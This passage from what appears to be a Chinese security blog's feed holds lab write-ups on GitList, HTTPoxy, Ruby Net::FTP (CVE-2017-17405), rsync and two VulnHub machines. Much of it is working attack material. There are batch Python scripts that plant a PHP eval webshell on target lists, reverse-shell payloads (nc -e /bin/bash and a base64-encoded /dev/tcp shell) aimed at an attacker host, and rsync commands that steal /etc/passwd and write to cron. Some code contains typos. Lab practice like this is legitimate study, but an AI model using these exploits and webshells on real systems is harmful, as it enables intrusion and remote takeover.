+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">yz = <span class="built_in">input</span>(<span class="string">&#x27;是否删除，删除扣1：&#x27;</span>)      <span class="comment">#自主选择是否删除文件</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.134:8080/example/tree/o/search&#x27;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">body = &#123;<span class="string">&#x27;query&#x27;</span>:<span class="string">&quot;--open-files-in-pager=echo &#x27;&lt;?php eval($_POST[&#x27;xxx&#x27;])?&gt;&#x27; &gt; /var/www/html/csm.php;&quot;</span>&#125;</span><br><span class="line">res = requests.post(url=url,data=body,headers=header)</span><br><span class="line">ress = requests.get(<span class="string">&#x27;http://192.168.1.134:8080/csm.php&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(ress.status_code)</span><br><span class="line"><span class="keyword">if</span> yz == <span class="number">1</span>:     <span class="comment">#判断是否删除文件</span></span><br><span class="line">    url = <span class="string">&#x27;http://192.168.1.134:8080/example/tree/s/search&#x27;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    body = &#123;<span class="string">&#x27;query&#x27;</span>: <span class="string">&quot;--open-files-in-pager=rm /var/www/html/csm.php;&quot;</span>&#125;   <span class="comment">#删除包</span></span><br><span class="line">    resz = requests.post(url=url, data=body, headers=header)    <span class="comment">#发送包</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<p>第三步，可以跑目录的添加，和已存在项目文件名的修改。细节完善。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">yz = <span class="built_in">input</span>(<span class="string">&#x27;是否删除，删除扣1：&#x27;</span>)   <span class="comment">#判断是否删除上传文件</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;D:/桌面/211.txt&#x27;</span>)    <span class="comment">#打开连接文件</span></span><br><span class="line">mul = <span class="built_in">open</span>(<span class="string">&#x27;D:/桌面/212.txt&#x27;</span>)     <span class="comment">#打开已存在项目名，必须对应</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    files = file.readline().strip()  <span class="comment">#按行读取连接</span></span><br><span class="line">    filem = mul.readline().strip()   <span class="comment">#按行读取项目名</span></span><br><span class="line">    <span class="keyword">if</span> filem == <span class="string">&#x27;&#x27;</span>:   <span class="comment">#判断项目名是否为空</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;已停止运行！&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span>                    <span class="comment">#为空退出</span></span><br><span class="line">    ab = files + filem               <span class="comment">#合成URL</span></span><br><span class="line">    url = <span class="string">&#x27;%s/tree/o/search&#x27;</span> % ab    <span class="comment">#最终URL</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    body = &#123;<span class="string">&#x27;query&#x27;</span>:<span class="string">&quot;--open-files-in-pager=echo &#x27;&lt;?php eval($_POST[&#x27;xxx&#x27;])?&gt;&#x27; &gt; /var/www/html/csm.php;&quot;</span>&#125;</span><br><span class="line">    res = requests.post(url=url,data=body,headers=header)   <span class="comment">#发送包</span></span><br><span class="line">    ziz = <span class="string">&#x27;%scsm.php&#x27;</span> %files      <span class="comment">#上传文件URL</span></span><br><span class="line">    ress = requests.get(ziz)     <span class="comment">#发送get包</span></span><br><span class="line">    <span class="keyword">if</span> ress.status_code == <span class="number">200</span>:    <span class="comment">#响应码判断</span></span><br><span class="line">    	<span class="built_in">print</span>(url ,<span class="string">&#x27;存在漏洞！&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> yz == <span class="string">&#x27;1&#x27;</span>:    <span class="comment">#判断是否删除文件</span></span><br><span class="line">        url = <span class="string">&#x27;%s/tree/o/search&#x27;</span> % ab</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        body = &#123;<span class="string">&#x27;query&#x27;</span>: <span class="string">&quot;--open-files-in-pager=rm /var/www/html/csm.php;&quot;</span>&#125; <span class="comment">#删除文件代码</span></span><br><span class="line">        resz = requests.post(url=url, data=body, headers=header)  <span class="comment">#发送包</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;文件已删除！&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file.close()     <span class="comment">#关闭连接文件</span></span><br><span class="line">mul.close()     <span class="comment">#关闭目录文件</span></span><br></pre></td></tr></table></figure>
+<h3 id="总结-8">总结</h3>
+<p>利用该漏洞建立文件需要猜测目录文件下存在那个字母，才能创建成功。漏洞危害性还比较大。建议升级6.0以上版本。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTPoxy漏洞远程攻击（CVE-2016-5385）</title>
+    <url>/2022/02/22/HTTPoxy%E6%BC%8F%E6%B4%9E%E8%BF%9C%E7%A8%8B%E6%94%BB%E5%87%BB%EF%BC%88CVE-2016-5385%EF%BC%89/</url>
+    <content><![CDATA[<h3 id="HTTPoxy介绍">HTTPoxy介绍</h3>
+<p>httpoxy是cgi中的一个环境变量。而服务器和CGI程序之间通信，一般是通过进程的环境变量和管道</p>
+<p>CGI是通用网关接口，一段运行在服务器中的程序</p>
+<h3 id="漏洞描述-2">漏洞描述</h3>
+<p>在CGI中会将http头部，加上HTTP_前缀，注册为环境变量。当header中发送一个Proxy，就会将她注册为HTTP_PROXY环境变量，可以获取目标主机的隐私数据。</p>
+<p>影响环境：HAProxy、Varnish、OpenBSD relayd、lighttpd、PHP、Python</p>
+<h3 id="漏洞复现-4">漏洞复现</h3>
+<p>打开vulhub环境，进行网页访问，这里网页显示的是公网ip</p>
+<p><img src="/images/image-20220218085853959.png" alt="image-20220218085853959"></p>
+<p>进行抓包修改，在header中加入proxy，进行发包，返回的也是公网ip</p>
+<p><img src="/images/image-20220218073922586.png" alt="image-20220218073922586"></p>
+<p>在另一端进行监听，接受数据</p>
+<p><code>nc -lvp 8000</code></p>
+<p><img src="/images/image-20220218074140952.png" alt="image-20220218074140952.png"></p>
+<p>建议使用有公网ip服务器进行操作，否则需要多次尝试。</p>
+<h3 id="脚本编写-3">脚本编写</h3>
+<p>首先进行发送包的编写。实现字典进行跑。</p>
+<ul>
+<li>发送包的编写监听端口验证</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.134:8080/index.php&#x27;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;Upgraade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Proxy&#x27;</span>:<span class="string">&#x27;192.168.1.128&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">vps = requests.get(url=url,headers=header)</span><br><span class="line"><span class="built_in">print</span>(vps.text)          <span class="comment">#获取返回网页</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>实现字典跑</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:/桌面/211.txt&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> files <span class="keyword">in</span> file:</span><br><span class="line">    	<span class="keyword">if</span> <span class="keyword">not</span> files：</span><br><span class="line">    		<span class="keyword">break</span></span><br><span class="line">        url = files</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&#x27;Upgraade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Proxy&#x27;</span>:<span class="string">&#x27;192.168.1.128&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        vps = requests.get(url=url,headers=header)</span><br><span class="line">        <span class="built_in">print</span>(vps.text)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2017-17405</title>
+    <url>/2022/02/22/cve-2017-17405/</url>
+    <content><![CDATA[<h3 id="信息介绍-3">信息介绍</h3>
+<p>Ruby Net::FTP 模块命令注入漏洞。</p>
+<p>Ruby Net::FTP 模块是一个FTP客户端，在上传和下载文件的过程中，打开本地文件时使用了<code>open</code>函数。而在ruby中，<code>open</code>函数是借用系统命令来打开文件的，且没用过滤shell字符，导致在用户控制文件名的情况下，可以注入任何命令</p>
+<p>Ruby是一个面向对象的脚本语言，基于该语言的</p>
+<h3 id="影响范围">影响范围</h3>
+<p>ruby 2.4.3之前版本存在该漏洞。</p>
+<h3 id="分析">分析</h3>
+<p>首先要确定Ruby是否使用<code>libcurl</code>为其FTP功能，如果是的话，这个漏洞是否可以在Ruby应用程序中触发。其次确定Ruby是否有自定义的FTP实现，是否也允许使用FTP通配符，如果使用，则确定问题是否存在于该实现中。</p>
+<h3 id="操作">操作</h3>
+<p><img src="/images/image-20220213045833512.png" alt="image-20220213045833512"></p>
+<p><img src="/images/image-20220213050013681.png" alt="image-20220213050013681"></p>
+<p>收集到网上信息，开始构建python文件，初步想法创建一个可输入变量，用来执行命令，用python的FTP库进行上传，实现漏洞的操作。</p>
+<p><code>注意</code>：这里使用vulhub编码完，运行后还需要启动FTP服务器才可以进行测试。这里使用python</p>
+<ul>
+<li>
+<p>pip install pyftpdlib  （pyftpdlib是python中的FTP服务器）</p>
+</li>
+<li>
+<p>python3 -m pyftpdlib -p 2121 -i 192.168.1.134 （-m 打开服务器，-p 指定端口，-i 指定地址，可以指定127.0.0.0.1）</p>
+<p><img src="/images/image-20220213074532183.png" alt="image-20220213074532183"></p>
+<p>现在可以开始编写python</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.1.134&#x27;</span>   <span class="comment">#目标地址</span></span><br><span class="line">username = <span class="string">&#x27;&#x27;</span>			 <span class="comment">#匿名登录</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">file = (<span class="string">&#x27;|nc$&#123;IFS&#125;-e$&#123;IFS&#125;/bin/bash$&#123;IFS&#125;192.168.1.128$&#123;IFS&#125;10000$&#123;IFS&#125;xxx.txt&#x27;</span> )</span><br><span class="line"><span class="comment">#恶意代码，反弹shell</span></span><br><span class="line">port = <span class="number">2121</span>               <span class="comment">#目标端口</span></span><br><span class="line"></span><br><span class="line">ftp = FTP()               <span class="comment">#打开FTP</span></span><br><span class="line"></span><br><span class="line">ftp.connect(host,port)    <span class="comment">#连接服务器</span></span><br><span class="line">ftp.login(username,password) <span class="comment">#进行匿名登录</span></span><br><span class="line">file_handel=<span class="string">&#x27;/&#x27;</span>           <span class="comment">#上传地址</span></span><br><span class="line">bufsize = <span class="number">1024</span>            <span class="comment">#缓存大小，storbinary必须设置缓存大小</span></span><br><span class="line">ftp.storbinary(file,file_handel,bufsize) <span class="comment">#进行上传</span></span><br><span class="line"><span class="built_in">print</span>(ftp.<span class="built_in">dir</span>)            <span class="comment">#查看是否上传成功</span></span><br><span class="line">ftp.quit                  <span class="comment">#关闭ftp连接</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在python内有内置库FTP，可以上传文件保存文件名时对系统执行恶意代码。这个方法没有尝试成功，记录一下曲折过程全是粗心。</p>
+<p>上面代码运行报错，并没理会以为是执行恶意代码所以报错，<img src="/images/image-20220213122117938.png" alt="image-20220213122117938"></p>
+<p>但是这里的报错是因为，ftp库上传文件需要加上大写的STOR，如下</p>
+<p><code>ftp.storbinary('STOP'+file,file_handel,bufsize)</code></p>
+<p>更改之后呢，报错变也变了，从500变成了550</p>
+<p><img src="/images/image-20220213122634099.png" alt="image-20220213122634099"></p>
+<p>网上查找到的内容较少，唯一一条有用的信息是，服务器不支持换存。未验证，同时也放弃了用FTP库。</p>
+<p>查询到信息可以通过brup进行抓包，通过修改命令进行执行恶意代码![195bd2b4c545c672ca92967a5ae7871](C:\Users\14025\AppData\Local\Temp\WeChat Files\195bd2b4c545c672ca92967a5ae7871.png)</p>
+<p>但是页面一直未能连接成功，在询问摸索一阵之后，在历史命令中，并没有发现docker启动的命令。</p>
+<p><code>docker-compose up -d</code></p>
+<p><img src="/images/image-20220213123656893.png" alt="image-20220213123656893"></p>
+<p>启动之后重新尝试之前的python命令，进行试验，报错雷同并没有什么改变。彻底放弃，使用burp进行抓包。</p>
+<p><img src="/images/image-20220213123954153.png" alt="image-20220213123954153"></p>
+<p>当执行恶意代码是中间空格会被编码，所以使用下面代码。</p>
+<p>将攻击IP和端口进行编码，上传后进行字符串内容，对编码内容进行解码，然后进行反弹</p>
+<p><code>|bash$&#123;IFS&#125;-c$&#123;IFS&#125;“&#123;echo,YmVhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEyOC8xMDAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code></p>
+<p><img src="/images/image-20220213124049569.png" alt="image-20220213124049569"></p>
+<p>关于${IFS}推断是guby的空格写法，关于guby网上的信息较少无法印证。</p>
+<p>代码执行，反弹shell成功，但是秒被断开。尝试多次依旧会被断开。<img src="/images/image-20220213125219857.png" alt="image-20220213125219857"></p>
+<p>开启docker容器内部查看，</p>
+<p><code>docker ps</code> 查看开启容器信息<br>
+<code>docker attach ip信息</code> 进入容器</p>
+<p><img src="/images/image-20220213125543246.png" alt="image-20220213125543246"></p>
+<p>进入容器后没有任何提示。也没有任何互交。用burp进行反弹shell，看看容器有什么反应。<img src="/images/image-20220213125755512.png" alt="image-20220213125755512"> 代码被执行成功了，但是紧接着容器执行了exit退出了。以为编译代码问题尝试几次依旧会直接执行eit</p>
+<p><img src="/images/image-20220213125929184.png" alt="image-20220213125929184"></p>
+<p><img src="/images/image-20220213114300189.png" alt="image-20220213114300189"></p>
+<p><img src="/images/image-20220213130045866.png" alt="image-20220213130045866"></p>
+<p>这时候想到之前没有被执行的FTP的python，尝试执行查看后台反应，报错不变，后台没有反应，原来一直错误出现在python身上，一直都和服务器没有交互，被人指点burp可以用那用python也可以模拟页面进行交互，开始尝试用get请求。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">url = &#x27;http://192.168.1.134:8080/download?uri=ftp://192.168.1.134:2121/&amp;file=|bash$&#123;IFS&#125;-c$&#123;IFS&#125;&quot;&#123;echo,PiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEyOC8xMDAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#x27;</span><br><span class="line"></span><br><span class="line">r = urllib.request.urlopen(url,context=context)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>执行之后，没有shell被反弹回来，查看一下服务器，发现内容被编码了，</p>
+<p><img src="/images/image-20220213130505564.png" alt="image-20220213130505564"></p>
+<p>上网查询ssl库，可以防止uel被编码，这次后台并没有编码url，但是传入的shell还是断开了。</p>
+<p><img src="/images/image-20220213115628794.png" alt="image-20220213115628794"></p>
+<p><img src="/images/image-20220213120542663.png" alt="image-20220213120542663"></p>
+<p><img src="/images/image-20220213120834013.png" alt="image-20220213120834013"></p>
+<p>有反弹还是会断，已经黔驴技穷了，安慰自己是漏洞为了安全这样做的。</p>
+<h3 id="总结-9">总结</h3>
+<p>漏洞整体不难，是自己对细节的敏感度太低，流程不够明确饶了很多路，也做了很多用过，马虎大意。想法单一</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>rsync 未授权访问漏洞</title>
+    <url>/2022/02/22/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="rsync介绍">rsync介绍</h3>
+<p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口。</p>
+<h3 id="漏洞详情-2">漏洞详情</h3>
+<p>就是忘记设置密码了。水一波选择这个漏洞。</p>
+<h3 id="漏洞复现-5">漏洞复现</h3>
+<p>vulhub进行环境的搭建。开始进行端口的扫描</p>
+<p><code>nmap -A 192.168.1.134</code></p>
+<p><img src="/images/image-20220218103144169.png" alt="image-20220218103144169"></p>
+<p>然后使用kali中的rsync进行漏洞利用</p>
+<p><code>rsync rsync://192.168.1.134/src</code></p>
+<p><img src="/images/image-20220218103332654.png" alt="image-20220218103332654"></p>
+<p>已经看到了所有文件了。现在使用一下rsync中上传和下载的命令进行熟悉</p>
+<p><code>rsync -av rsync://192.168.1.134/src/etc/passwd /root/passwd.txt</code></p>
+<p><img src="/images/image-20220218103816648.png" alt="image-20220218103816648"></p>
+<p><code>rsync -av shell rsync://192.168.1.134/src/etc/cron.hourly</code></p>
+<p>上传的时候文件在前面，下载的时候文件在后面。已经可以上传下载了，这就等于大路通了。水完一波</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jangow01</title>
+    <url>/2022/02/22/jangow01/</url>
+    <content><![CDATA[<h3 id="jangow01">jangow01</h3>
+<p>需要使用orecle VM virtualBox启动。网络连接设置为Bridged Adapter。</p>
+<p>靶机IP：192.168.1.105<br>
+攻击者：192.168.1.112</p>
+<p>假装不知道靶机ip扫描一下c段存活主机。</p>
+<p>nmap -sP 192.168.1.1/24（<em>使用ping扫描，部分设备有时扫描不到。需要多扫描几次</em>）</p>
+<p><img src="/images/image-20220125040311477.png" alt="image-20220125040311477">                            <em>三次扫描才发现地址</em></p>
+<p>nmap -p0 192.168.1.1/24 （<em>无ping扫描，可以看到开启的端口</em>）</p>
+<p><img src="/images/image-20220125040731049.png" alt="image-20220125040731049">                       <em>并没有看到开放端口</em></p>
+<p>nmap -PS 192.168.1.1/24 （<em>传输层的TCP/IP扫描，通过发送和接受报文形式扫描</em>）</p>
+<p><img src="/images/image-20220125040611074.png" alt="image-20220125040611074"></p>
+<p>nmap -PA 192.168.1.1/24 （<em>使用SYN和ACK两种扫描，提高逃避防火墙的概率</em>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">向服务器发送一个SYN数据包，假装发起一个三方握手，如果服务器从特定端口返回SYN/ACK数据包，随后攻击方发送一个RST数据包，让服务器以为存在一个通信错误，放弃继续握手连接。可以用的漏洞攻击，向服务器发送大量SYN数据包，消耗服务器资源，无法进行正常服务。</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20220125040949712.png" alt="image-20220125040949712"></p>
+<p>nmap -PU 192.168.1.1/24 （<em>udp扫描会发送空的报文测试设备是否在线</em>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">udp端口收到数据包并不会回复，是ICMP协议中，向服务器未提供服务的端口发送数据时，服务器会自动回复“远端端口未打开”，根据此错误进行判断。</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20220125041055904.png" alt="image-20220125041055904"></p>
+<p>nmap -PR 192.168.1.1/24 （<em>对目标进行arp ping扫描，大部分情况下不会禁止arp请求</em>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">局域网内主机间进行通讯识别的请求，请求机发送ip1进行广播寻找mac1地址，局域网内接受到ip1广播判断与自己ip是否相同，不同则丢弃数据包。相同开始映射请求机的ip地址和mac地址，将自己的ip1与mac1发送给请求机，建立连接。可以用的漏洞攻击，当请求机进行广播后收到两条数据包时会使用时间晚的数据包中的mac。攻击机收到请求机的广播后不丢弃，将自己的mac不间断的发送给请求机导致请求机判断错误，误认为攻击机为通讯目标进行通讯。</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20220125041247000.png" alt="image-20220125041247000"></p>
+<p>nmap -sL 192.168.1.1/24 （<em>仅仅是列出指定网络上的每台主机，不发送任何报文</em>）</p>
+<p><img src="/images/image-20220125041407872.png" alt="image-20220125041407872">                            <em>试了三次并没有扫出来</em></p>
+<p>nmap -R 192.168.1.1/24 （<em>反向域名解析</em>）</p>
+<p><img src="/images/image-20220125041536689.png" alt="image-20220125041536689"></p>
+<p>nmap --traceroute -v 192.168.1.1/24 （<em>帮助用户了解网络通行的情况</em>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跟踪一个分组从源点到终点的路径。Traceroute向目标主机发送一连串的ip数据，第一个数据报p1的生存时间TTL设置为1。当p1到达路径上第一个路由器r1时，路由器将TTL值减1.由于TTL等于0，r1向源主机发送一个ICMP时间超过差错报文。通过调整TTL了解路径上的情况。</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20220125041653424.png" alt="image-20220125041653424"></p>
+<p>nmap -sV -p 21，80 -n 192.168.1.105 （<em>扫描端口具体信息</em>）</p>
+<p><img src="/images/image-20220126054631120.png" alt="image-20220126054631120"></p>
+<p>扫描打开的端口有21、80。登录页面查看。</p>
+<p><img src="/images/image-20220125063417744.png" alt="image-20220125063417744"> 打开了一个全是英文的主题网站。脑袋大全是英文。</p>
+<p><img src="/images/image-20220125063524058.png" alt="image-20220125063524058"></p>
+<p>靶机复刻的https://startbootstrap.com/theme/grayscale/网页</p>
+<p>要用邮箱搜索，但是无反应。</p>
+<p><img src="/images/image-20220125063857054.png" alt="image-20220125063857054"></p>
+<p>先使用dirb进行目录扫描看看有没有什么东西。<code>dirb是一个基于字典的web目录扫描工具，会用递归的方式来获取更多的目录，还支持代理和http认证限制访问的网站</code></p>
+<p>dirb <a href="http://192.168.1.105">http://192.168.1.105</a> /usr/share/wordlists/dirb/big.txt</p>
+<p><img src="/images/image-20220126055713212.png" alt="image-20220126055713212"> 并没有什么有用的目录，看看网页有什么漏洞。</p>
+<p>发现一个可以插入参数的地方，直接执行命令。</p>
+<p><img src="/images/image-20220125064155731.png" alt="image-20220125064155731"></p>
+<p><img src="/images/image-20220125064302578.png" alt="image-20220125064302578"></p>
+<p>是个低权限的，先写马，还是先提权。在看看21、ftp端口。</p>
+<p><img src="/images/image-20220126063517586.png" alt="image-20220126063517586"></p>
+<p>不允许匿名登录。</p>
+<p>尝试在页面反弹shell</p>
+<p><img src="/images/image-20220126065644014.png" alt="image-20220126065644014">没有反应。</p>
+<p>尝试写入一句话代码echo ‘&lt;?php eval($_POST[“sain”]);’&gt; sain.php 蚁剑连接</p>
+<p><img src="/images/image-20220128083900105.png" alt="image-20220128083900105"></p>
+<p><img src="/images/image-20220128091218987.png" alt="image-20220128091218987"> <img src="/images/image-20220128091433533.png" alt="image-20220128091433533"></p>
+<p><img src="/images/image-20220128091730178.png" alt="image-20220128091730178"></p>
+<p>连接蚁剑尝试提权，第一次尝试sudo漏洞，判断sudo版本。</p>
+<p><img src="/images/image-20220128205626231.png" alt="image-20220128205626231"></p>
+<p>Linux sudo权限提升漏洞（CVE-2021-3156）进行判断，<img src="/images/image-20220128210058816.png" alt="image-20220128210058816">    该系统不存在该漏洞，可能存在漏洞的是以sudoedit的回显。</p>
+<p>SUID提权<img src="/images/image-20220128212111666.png" alt="image-20220128212111666"><img src="/images/image-20220128212120103.png" alt="image-20220128212120103"> 该系统中并没有已知提权的文件。</p>
+<p><img src="/images/image-20220129051458470.png" alt="image-20220129051458470"> 通过searchsploit 查到ubuntu提权漏洞，/usr/share/exploitdb/exploits/linux/local通过蚁剑上传，给文件添加增写，gcc运行该文件，生成a.out。运行./a.out 无果。</p>
+<p>尝试建立互交shell，反弹shell，连接到shell,重新尝试./a.out，获得root权限、进入root文件夹内。只有一个proof.txt打开获得flad<img src="/images/image-20220129204915342.png" alt="image-20220129204915342"></p>
+<p>对反弹shell和提权欠缺。</p>
+]]></content>
+      <categories>
+        <category>靶机</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HACKADEMIC. 	RTB1</title>
+    <url>/2022/02/22/%E9%9D%B6%E6%9C%BA02/</url>
+    <content><![CDATA[<h2 id="HACKADEMIC-RTB1">HACKADEMIC: RTB1</h2>
+<p>靶机使用：VMware</p>
+<p>操作系统：Linux</p>
+<p>下载地址：<a href="https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip</a></p>
+<p>完成界面：</p>
+<p><img src="/images/image-20220130022306198.png" alt="image-20220130022306198"></p>
+<h3 id="收集信息-2">收集信息</h3>
+<p>攻击IP：192.168.1.112</p>
+<p>确定目标IP：192.168.1.105</p>
+<p>扫描端口：</p>
+<p>nmap -T4 -O 192.168.1.105<img src="/images/image-20220130022844551.png" alt="image-20220130022844551"></p>
+<p>系统：Linux 2.6.22-2.6.36</p>
+<p>开放端口：22 ssh<br>
+80 http</p>
+<p>访问80端口</p>
+<p><img src="/images/image-20220130023157151.png" alt="image-20220130023157151"></p>
+<p>提示访问Key.txt<img src="/images/image-20220130023454513.png" alt="image-20220130023454513">发现了 Apache/2.2.15（Fedoras)</p>
+<p><img src="/images/image-20220130023608039.png" alt="image-20220130023608039"> 可以传参的地方。</p>
+<p><img src="/images/image-20220130023744046.png" alt="image-20220130023744046"></p>
